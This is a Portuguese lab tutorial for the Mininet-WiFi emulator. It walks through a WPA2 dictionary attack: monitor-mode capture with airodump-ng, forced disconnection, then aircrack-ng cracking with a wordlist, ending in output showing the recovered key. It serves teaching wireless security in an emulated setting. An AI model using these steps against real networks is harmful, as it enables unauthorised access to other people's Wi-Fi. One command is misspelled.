************
Dictionary attack
************


.. Note::
  
  **Ao longo deste documento você irá aprender como realizar o ataque de dicionário:** 

  **Requisitos:** 
  - Mininet-WiFi - https://github.com/intrig-unicamp/mininet-wifi
  - airodump-ng
  
  **A VM disponível em https://github.com/intrig-unicamp/mininet-wifi deverá possuir todos os recursos necessários para reproduzir este documento. Caso algum pacote estiver faltando, instale-os**
  

Primeiro, execute uma topologia simples que provê autenticação com WPA2 através do comando abaixo:

.. code:: console

    ~/mininet-wifi$ sudo python examples/authentication.py


A topologia de rede do código `authentication.py` consiste de duas estações conectadadas a um ponto de acesso. Para realizar este experimento, vamos inicialmente criar uma interface do tipo monitor chamada `mon0` a partir da estação `sta1`.

Para criar uma interface do tipo monitor execute o comando abaixo: 

.. code:: console

    mininet-wifi> sta1 iw dev sta1-wlan0 interface add mon0 type monitor


Então, utilize o **airodump-ng** para capturar beacons na interface recém-criada:

.. code:: console

    mininet-wifi> sta1 ifconfig mon0 up
    mininet-wifi> sta1 airodump-ng mon0

 
Identifique o endereço MAC da estação na coluna station. 
**Dica**: Identifique o BSSID do AP ao qual a estação está conectada. O SSID pode servir de apoio.

Então, rode novamente o **airodump-ng** com os parâmetros abaixo:

.. code:: console

    mininet-wifi> xterm sta1
    sta1-term# airodump-ng --bssid 02:00:00:00:02:00 mon0 -w minha-captura


Em seguida, force a desconexão de **sta1**.


.. code:: console
    
    mininet-wifi> sta1 iw dev sta1-wlan0 disconnet


Agora, crie um arquivo chamado `arquivo.psk` contendo o seguinte conteúdo:

.. code:: console

    123456789a
    abcdefgh
    0011223344


Em seguida, execute o comando abaixo:

.. code:: console

    mininet-wifi> sta1 aircrack-ng -w arquivo.psk -b 02:00:00:00:02:00 minha-captura-01.cap


E voi-lá! Senha descoberta!


.. code:: console
    Aircrack-ng 1.6 

          [00:00:00] 3/3 keys tested (63.70 k/s) 

          Time left: --

                              KEY FOUND! [ 123456789a ]


          Master Key     : E0 3D DC 8E 51 FB 0A 35 A6 EE 6D DF 9B 6B 69 EB 
                           E8 C0 7B D2 50 95 63 A7 26 43 DD B2 0F 46 E6 21 

          Transient Key  : 55 6C 6D AA 5D B2 DC E6 C3 FB 38 59 C8 B4 5D B3 
                           1E 3B AB 48 81 8E 94 AB 50 94 9E 25 61 8D D4 F0 
                           B9 1E 4F 3C 9C 84 48 3D 8B 09 86 1D 98 31 23 57 
                           4B 03 8F B4 86 8F 8D A4 59 CD 30 2D 71 D7 AF 18 

      EAPOL HMAC     : C1 3D 58 9D 02 CB 03 4A FC 3D 44 96 FF 2D 5D 79
      ```
